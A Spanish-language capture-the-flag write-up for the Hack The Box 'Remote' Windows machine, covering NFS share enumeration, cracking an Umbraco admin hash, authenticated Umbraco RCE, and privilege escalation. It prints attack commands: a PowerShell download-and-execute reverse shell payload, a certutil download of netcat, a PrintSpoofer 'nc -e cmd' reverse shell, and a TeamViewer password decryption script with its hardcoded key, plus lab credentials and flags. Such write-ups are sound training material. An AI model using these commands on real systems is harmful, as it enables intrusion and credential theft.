---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/234
dificultad: Fácil
ip: 10.10.10.180
os: Windows
relacionados:
  - "[[NFS Enumeration]]"
  - "[[showmount]]"
  - "[[Information Leakage]]"
  - "[[Abusing Umbraco Admin Panel]]"
  - "[[Remote Code Execution|RCE]]"
  - '[[Abuso de SeImpersonatePrivilege (Ataques "Potato")]]'
  - "[[TeamViewer - Escalada de Privilegios - Descifrado de Contraseñas (CVE-2019-18988)]]"
  - "[[Password Reuse]]"
---
# HackTheBox - Remote

## Reconocimiento

Mi primer paso en cualquier evaluación es realizar un escaneo exhaustivo de puertos para entender la superficie de ataque. Para ello, utilicé **Nmap**.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports

nmap -sCV -p21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49677,49678,49679,49680 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El escaneo reveló varios servicios interesantes en la máquina Windows:

- **FTP (21/tcp):** Permite el acceso anónimo.
- **HTTP (80/tcp):** Un servidor web Microsoft IIS.
- **SMB (445/tcp):** El servicio estándar para compartir archivos en Windows.
- **NFS (2049/tcp):** Network File System, un servicio para compartir archivos que es más común en entornos Linux.

Aunque intenté conectarme por FTP anónimo, no encontré ningún archivo útil, así que decidí centrarme en los otros servicios.

### Directorios web con GoBuster

Para investigar el servidor web en el puerto 80, lancé **GoBuster** con una lista de directorios comunes para descubrir contenido oculto.
```Bash
gobuster dir -u http://$(cat ip) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --no-error -o 01_Reconnaissance/dirs
```

El resultado más prometedor fue el directorio `/umbraco`. Al navegar hacia él, confirmé que el sitio estaba utilizando **Umbraco**, un conocido Sistema de Gestión de Contenidos (CMS). Intenté varias credenciales por defecto (`admin:admin`, `admin:password`, etc.) sin éxito.

### Enumeración de recursos compartidos NFS

La presencia de un servicio NFS en una máquina Windows es poco común y llama la atención. Para ver qué recursos se estaban compartiendo, utilicé la herramienta `showmount`.
```Bash
showmount -e 10.10.10.180
```

El comando me mostró que el recurso `/site_backups` estaba compartido para `(everyone)`, lo que significa que cualquiera en la red podía acceder a él sin autenticación. Procedí a montar este recurso compartido en mi máquina local para inspeccionar su contenido.
```Bash
mkdir /mnt/backups
sudo mount -t nfs 10.10.10.180:/site_backups /mnt/backups/
```

> [!NOTE] Un recurso NFS mal configurado y accesible por todos es una fuente común de fugas de información crítica. Siempre es uno de los primeros puntos a revisar.

Al listar el contenido del directorio montado, encontré una copia de seguridad completa del sitio web de Umbraco.


___

## Análisis de vulnerabilidades

### Archivos de configuración en el backup de Umbraco

Sabiendo que las aplicaciones web a menudo almacenan credenciales en archivos de configuración o bases de datos, investigué la estructura de archivos del backup. La documentación de Umbraco indica que la información de los usuarios, incluidas las contraseñas, se almacena en el archivo `Umbraco.sdf` dentro del directorio `App_Data`.

Utilicé el comando `strings` para buscar cadenas de texto legibles dentro de este archivo de base de datos, filtrando por el usuario "admin".
```Bash
strings /mnt/backups/Umbraco/App_Data/Umbraco.sdf | grep admin
```

Este comando reveló un usuario, `admin@htb.local`, y lo que parecía ser su hash de contraseña: `b8be16afba8c314ad33d812f22a04991b90e2aaa`. El formato del hash correspondía a **SHA1**.


___

## Explotación de vulnerabilidades

### Acceso al panel de Umbraco CMS

Con el hash en mi poder, utilicé **John The Ripper** y la popular lista de contraseñas `rockyou.txt` para intentar crackearlo.
```Bash
echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > hash.txt
john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> [!SUCCESS] Credenciales obtenidas
> 
> - **Usuario:** `admin@htb.local`
> - **Contraseña:** `baconandcheese`

Con estas credenciales, pude iniciar sesión en el panel de administración de Umbraco en `http://10.10.10.180/umbraco`.

### Ejecución de código remota (RCE) en Umbraco

Una vez dentro, mi primer objetivo fue identificar la versión del CMS. En la esquina inferior izquierda, el icono de ayuda reveló que se trataba de la **versión 7.12.4**.

Una búsqueda rápida me informó que esta versión es vulnerable a una **Ejecución de Código Remota (RCE) autenticada**. Encontré un script de explotación público en Python que aprovechaba esta falla.

Para confirmar la vulnerabilidad de forma segura, modifiqué el payload del exploit para que realizara una simple petición web a mi máquina usando PowerShell.
```Python
# Payload de prueba en el script de exploit
payload = '... string cmd = "/c ping 10.10.14.17"; ...'
```

Pongo en escucha `tcpdump` para ver si el comando funciona:
```bash
tcpdump -i tun0 icmp -n
```
Compruebo que funciona.

**Reverse shell `Nishang`**:
Los pases que hice para ejecutar la reverse shell en memoria fueron:

1) Compartí mis archivos con un servidor Python:
```bash
python3 -m http.server 80
```

2) Me puse en escucha:
```bash
rlwrap nc -nlvp 443
```

3) Modifiqué el payload para llamar la reverse de Nishang:
```bash
payload = '... string cmd = "/c powershell IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.14.17/Invoke-PowerShellTcp.ps1\')"; ...'
```

4) Ejecuté el script:
```bash
python2 46153.py
```

Obtengo una shell en la maquina vicima.


___

## Escalada de privilegios

### 1) Abuso de privilegios con PrintSpoofer

Como ruta alternativa, investigué los privilegios del usuario `iis apppool\defaultapppool` con el que obtuve la shell inicial.
```PowerShell
whoami /priv
```

El resultado mostró que el usuario poseía el privilegio `SeImpersonatePrivilege`. En sistemas operativos Windows modernos, este privilegio puede ser abusado para escalar a `SYSTEM` usando exploits como **PrintSpoofer**.

1. Descargo el ejecutable de `PrintSpoofer.exe` en mi máquina.

2. Subo el binario al servidor:
```bash
python3 -m http.server 80
certutil -urlcache -split -f http://10.10.14.17/nc.exe nc.exe
```

3. Ejecuto `./PrintSpoofer.exe -c ".\nc.exe 10.10.14.17 443 -e cmd"` para obtener una reverse shell como `SYSTEM`. 

4. En caso de no funciona subo también `nc.exe` y pido una reverse shell a través del mismo:
```bash
rlwrap nc -nlvp 443

C:\temp\PrintSpoofer.exe -c "C:\temp\nc.exe 10.10.14.17 443 -e cmd"
```

Logro acceso a Administrator.

### Abuso de TeamViewer 

[[TeamViewer - Escalada de Privilegios - Descifrado de Contraseñas (CVE-2019-18988)]]

Reviso la versión escrita para Metasploit en Ruby para ubicar la ruta de TeamViewer7 donde guarda la key que necesito:
```bash
cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

Me dirijo a la ruta en cuestión: 
```powershell
cd HKLM:SOFTWARE\WOW6432Node\TeamViewer\Version7
```

Obtengo información:
```powershell
Get-ItemProperty .
```

Expando la información con el campo SecurityPasswordAES:
```powershell
(Get-ItemProperty .).SecurityPasswordAES
```

Guardé la salida en un fichero llamado `aes`, lo corregí para que estén separadas por `,` y no en lineas:
```bash
cat aes | paste -sd, | sponge aes
```

Usé el siguiente código donde remplacé el `passwordsaes` por el mio:
```python
#!/usr/bin/env python3
import binascii, argparse
from Crypto.Cipher import AES

K=binascii.unhexlify("0602000000a400005253413100040000")
IV=binascii.unhexlify("0100010067244F436E6762F25EA8D704")

def dec(s):
    try: c=binascii.unhexlify(s.strip())
    except: c=bytes(int(x) for x in s.split(','))
    pt=AES.new(K,AES.MODE_CBC,IV).decrypt(c)
    try: return pt.decode('utf-16le').strip('\x00')
    except: return pt.decode('utf-8','ignore').strip('\x00')

p=argparse.ArgumentParser()
p.add_argument('-c','--cipher',required=True)
a=p.parse_args()
print(dec(a.cipher))
```

```bash
python3 test.py -c 255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91
```
Respuesta: `!R3m0te!`

Tengo la contraseña para el usuario Administrator. La flag está en el mismo lugar de siempre.


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 31c07011d74eadd0251bf46fc9b0c775
^bandera

> [!FLAG] `flag{root}`
> 25fd8cb265ad103f151311bee56b0815
^bandera